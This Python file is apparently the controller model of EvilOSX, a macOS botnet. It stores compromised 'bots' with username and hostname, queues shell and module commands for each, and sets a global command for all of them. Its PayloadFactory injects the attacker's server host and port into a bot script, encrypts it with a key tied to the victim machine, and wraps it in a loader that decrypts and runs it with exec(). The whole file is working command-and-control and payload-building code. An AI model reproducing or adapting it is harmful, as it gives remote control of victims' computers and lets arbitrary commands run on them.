# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import sqlite3
from base64 import b64encode
from os import path
from threading import RLock
import json
from textwrap import dedent
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Hash import MD5
from typing import Tuple, Optional


class RequestType:
    """Enum class for bot request types."""
    STAGE_1 = 0
    GET_COMMAND = 1
    RESPONSE = 2


class CommandType:
    """Enum class for command types."""
    NONE = 0
    MODULE = 1
    SHELL = 2


class Command:
    """This class represents a command."""

    def __init__(self, command_type: int, command: bytes = b"", options: dict = None):
        self.type = command_type
        self.command = command
        self.options = options

    def __str__(self):
        """:return: The base64 string representation of this class which can be sent over the network."""
        if self.type == CommandType.NONE:
            return ""
        else:
            formatted = "{}\n{}\n".format(str(self.type), b64encode(self.command).decode())
            if self.options:
                formatted += b64encode(json.dumps(self.options).encode()).decode()

            return b64encode(formatted.encode()).decode()


class Bot:
    """This class represents a bot."""

    def __init__(self, bot_uid: str, username: str, hostname: str, last_seen: float):
        self.uid = bot_uid
        self.username = username
        self.hostname = hostname
        self.last_seen = last_seen


class Model:
    """Thread-safe model used by the controller."""

    def __init__(self):
        self._database_path = path.realpath(path.join(path.dirname(__file__), path.pardir, "data", "EvilOSX.db"))
        self._database = sqlite3.connect(self._database_path, check_same_thread=False)
        self._cursor = self._database.cursor()
        self._lock = RLock()  # It's important this is an RLock and not a Lock.

        # Create our tables.
        self._cursor.execute("DROP TABLE IF EXISTS bots")
        self._cursor.execute("DROP TABLE IF EXISTS commands")
        self._cursor.execute("DROP TABLE IF EXISTS global_command")
        self._cursor.execute("DROP TABLE IF EXISTS global_executed")

        self._cursor.execute("CREATE TABLE bots("
                             "bot_uid text PRIMARY KEY, "
                             "username text, "
                             "hostname text, "
                             "last_seen real)")
        self._cursor.execute("CREATE TABLE commands("
                             "bot_uid text, "
                             "command text)")
        self._cursor.execute("CREATE TABLE global_command("
                             "command text)")
        self._cursor.execute("CREATE TABLE global_executed("
                             "uid text)")

        self._database.commit()

    def add_bot(self, bot: Bot):
        """Adds a bot to the database."""
        with self._lock:
            self._cursor.execute("INSERT INTO bots VALUES(?,?,?,?)",
                                 (bot.uid, bot.username, bot.hostname, bot.last_seen))
            self._database.commit()

    def remove_bot(self, bot_uid: str):
        """Removes the bot from the database."""
        with self._lock:
            self._cursor.execute("DELETE FROM bots WHERE bot_uid = ?", (bot_uid,))
            self._database.commit()

    def is_known_bot(self, bot_uid: str) -> bool:
        """:return True if the bot is already known to us."""
        with self._lock:
            response = self._cursor.execute("SELECT * FROM bots WHERE bot_uid = ?", (bot_uid,)).fetchone()

            if response:
                return True
            else:
                return False

    def get_bots(self, limit: int = -1, skip_amount: int = 0) -> list:
        """:return: A list of bot objects."""
        with self._lock:
            bots = []
            response = self._cursor.execute("SELECT * FROM bots LIMIT ? OFFSET ?", (limit, skip_amount))

            for row in response:
                bots.append(Bot(row[0], row[1], row[2], row[3]))

            return bots

    def get_bot_amount(self) -> int:
        """:return: The amount of bots in the database."""
        with self._lock:
            response = self._cursor.execute("SELECT Count(*) FROM bots")
            return response.fetchone()[0]

    def set_global_command(self, command: Command):
        """Sets the global command."""
        with self._lock:
            self._cursor.execute("DELETE FROM global_command")
            self._cursor.execute("INSERT INTO global_command VALUES(?)", (str(command),))
            self._database.commit()

    def get_global_command(self) -> str:
        """:return: The globally set raw command."""
        with self._lock:
            response = self._cursor.execute("SELECT * FROM global_command").fetchone()

            if not response:
                return ""
            else:
                return response[0]

    def add_executed_global(self, uid: str):
        """Adds the bot the list of who has executed the global module."""
        with self._lock:
            self._cursor.execute("INSERT INTO global_executed VALUES (?)", (uid,))
            self._database.commit()

    def has_executed_global(self, uid: str) -> Tuple[bool, Optional[str]]:
        """:return: True if the bot has executed the global command or if no global command has been set."""
        with self._lock:
            global_command = self.get_global_command()

            if not global_command:
                return True, None
            else:
                response = self._cursor.execute("SELECT * FROM global_executed WHERE uid = ? LIMIT 1",
                                                (uid,)).fetchone()

                if response:
                    return True, None
                else:
                    return False, global_command

    def add_command(self, bot_uid: str, command: Command):
        """Adds the command to the bot's command queue."""
        with self._lock:
            self._cursor.execute("INSERT INTO commands VALUES(?,?)", (bot_uid, str(command)))
            self._database.commit()

    def get_command_raw(self, bot_uid: str) -> str:
        """Return and removes the first (raw base64) command in the bot's command queue, otherwise an empty string."""
        with self._lock:
            response = self._cursor.execute("SELECT * FROM commands WHERE bot_uid = ?", (bot_uid,)).fetchone()

            if not response:
                return ""
            else:
                self._remove_command(bot_uid)
                return response[1]

    def _remove_command(self, bot_uid: str):
        """Removes the first command in the bot's queue."""
        with self._lock:
            # Workaround for https://sqlite.org/compile.html#enable_update_delete_limit
            self._cursor.execute("DELETE FROM commands WHERE rowid = "
                                 "(SELECT rowid FROM commands WHERE bot_uid = ? LIMIT 1)", (bot_uid,))
            self._database.commit()


class PayloadFactory:
    """Builds encrypted payloads which can only be run on the specified bot."""

    @staticmethod
    def create_payload(bot_uid: str, payload_options: dict, loader_options: dict) -> str:
        """:return: The encrypted payload wrapped in the specified loader."""
        # Configure bot.py
        with open(path.realpath(path.join(path.dirname(__file__), path.pardir, "bot", "bot.py"))) as input_file:
            configured_payload = ""

            server_host = payload_options["host"]
            server_port = payload_options["port"]
            program_directory = loader_options["program_directory"]

            for line in input_file:
                if line.startswith("SERVER_HOST = "):
                    configured_payload += "SERVER_HOST = \"{}\"\n".format(server_host)
                elif line.startswith("SERVER_PORT = "):
                    configured_payload += "SERVER_PORT = {}\n".format(server_port)
                elif line.startswith("PROGRAM_DIRECTORY = "):
                    configured_payload += "PROGRAM_DIRECTORY = os.path.expanduser(\"{}\")\n".format(program_directory)
                else:
                    configured_payload += line

        # Encrypt the payload using the bot's unique key
        return dedent("""\
        #!/usr/bin/env python
        # -*- coding: utf-8 -*-
        import os
        import getpass
        import uuid
        
        def get_uid():
            return "".join(x.encode("hex") for x in (getpass.getuser() + "-" + str(uuid.getnode())))
        
        exec("".join(os.popen("echo '{}' | openssl aes-256-cbc -A -d -a -k %s -md md5" % get_uid()).readlines()))
        """.format(PayloadFactory._openssl_encrypt(bot_uid, configured_payload)))

    @staticmethod
    def wrap_loader(loader_name: str, loader_options: dict, payload: str) -> str:
        """:return: The loader which will load the (configured and encrypted) payload."""
        loader_path = path.realpath(path.join(
            path.dirname(__file__), path.pardir, "bot", "loaders", loader_name, "install.py")
        )
        loader = ""

        with open(loader_path, "r") as input_file:
            for line in input_file:
                if line.startswith("LOADER_OPTIONS = "):
                    loader += "LOADER_OPTIONS = {}\n".format(str(loader_options))
                elif line.startswith("PAYLOAD_BASE64 = "):
                    loader += "PAYLOAD_BASE64 = \"{}\"\n".format(b64encode(payload.encode()).decode())
                else:
                    loader += line

        return loader

    @staticmethod
    def _openssl_encrypt(password: str, plaintext: str) -> str:
        # Thanks to Joe Linoff, taken from https://stackoverflow.com/a/42773185
        salt = get_random_bytes(8)
        key, iv = PayloadFactory._get_key_and_iv(password, salt)

        # PKCS#7 padding
        padding_len = 16 - (len(plaintext) % 16)
        padded_plaintext = plaintext + (chr(padding_len) * padding_len)

        # Encrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = cipher.encrypt(padded_plaintext.encode())

        # Make OpenSSL compatible
        openssl_cipher_text = b"Salted__" + salt + cipher_text
        return b64encode(openssl_cipher_text).decode()

    @staticmethod
    def _get_key_and_iv(password: str, salt: bytes, key_length: int = 32, iv_length: int = 16) -> tuple:
        password = password.encode()

        try:
            max_length = key_length + iv_length
            key_iv = MD5.new(password + salt).digest()
            tmp = [key_iv]

            while len(tmp) < max_length:
                tmp.append(MD5.new(tmp[-1] + password + salt).digest())
                key_iv += tmp[-1]  # Append the last byte

            key = key_iv[:key_length]
            iv = key_iv[key_length:key_length + iv_length]
            return key, iv
        except UnicodeDecodeError:
            return None, None
